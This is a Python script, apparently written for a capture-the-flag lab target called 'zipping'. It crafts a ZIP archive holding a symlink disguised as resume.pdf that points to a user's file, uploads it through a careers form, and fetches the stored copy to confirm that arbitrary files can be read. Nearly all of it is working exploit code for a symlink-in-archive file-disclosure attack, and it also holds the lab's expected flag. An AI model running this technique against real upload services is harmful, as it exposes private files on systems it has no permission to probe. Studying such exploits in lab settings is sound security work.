#!/usr/bin/env python3
"""Check whether Zipping's real ZIP upload exposes the final Web Flag directly.

The script talks only to the disposable target on an internal Docker network.
It creates a standards-compliant Unix symlink entry named resume.pdf, uploads
it through the public careers form, then fetches the returned upload URL.
"""
from io import BytesIO
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin
import re
import stat
import zipfile

BASE = "http://zipping:8080"
EXPECTED = b"TTP{zipping_symlink_probe_2026}"
TARGET = "/home/rektsu/user.txt"


def make_symlink_zip(target: str) -> bytes:
    buffer = BytesIO()
    info = zipfile.ZipInfo("resume.pdf")
    info.create_system = 3
    info.external_attr = (stat.S_IFLNK | 0o777) << 16
    info.compress_type = zipfile.ZIP_STORED
    with zipfile.ZipFile(buffer, "w") as archive:
        archive.writestr(info, target.encode())
    return buffer.getvalue()


def upload(payload: bytes):
    boundary = "----TTPZippingSymlinkProbeBoundary"
    body = (
        b"--" + boundary.encode() + b"\r\n"
        b'Content-Disposition: form-data; name="zip_file"; filename="resume.zip"\r\n'
        b"Content-Type: application/zip\r\n\r\n"
        + payload
        + b"\r\n--" + boundary.encode() + b"--\r\n"
    )
    request = Request(
        BASE + "/upload.php",
        data=body,
        headers={"Content-Type": "multipart/form-data; boundary=" + boundary},
        method="POST",
    )
    with urlopen(request, timeout=20) as response:
        return response.status, response.read()


def main():
    print("Probe target:", BASE)
    print("Symlink target:", TARGET)
    try:
        status, html = upload(make_symlink_zip(TARGET))
    except (HTTPError, URLError, TimeoutError) as error:
        print("RESULT=INCONCLUSIVE upload request failed:", repr(error))
        return 20

    if status != 200 or b"Your CV was uploaded successfully." not in html:
        print("RESULT=UPLOAD_REJECTED")
        print("HTTP:", status)
        print("Response:", html[:1200].decode("utf-8", "replace"))
        return 20

    match = re.search(rb'href="(/uploads/[^"]+)"', html)
    if not match:
        print("RESULT=INCONCLUSIVE upload succeeded but no document URL was returned")
        print(html[:1200].decode("utf-8", "replace"))
        return 20

    uploaded_url = urljoin(BASE, match.group(1).decode("utf-8", "replace"))
    print("Uploaded document URL:", uploaded_url)
    try:
        request = Request(uploaded_url, method="GET")
        with urlopen(request, timeout=20) as response:
            content = response.read(8192)
            status = response.status
    except (HTTPError, URLError, TimeoutError) as error:
        print("RESULT=NOT_READABLE document URL did not return target:", repr(error))
        return 0

    if EXPECTED in content:
        print("RESULT=DIRECT_FLAG_READ_CONFIRMED")
        print("The upload endpoint exposed the final Flag without SQLi, FILE write or LFI.")
        return 10

    print("RESULT=NOT_READABLE")
    print("HTTP:", status)
    print("Body preview:", content[:500].decode("utf-8", "replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
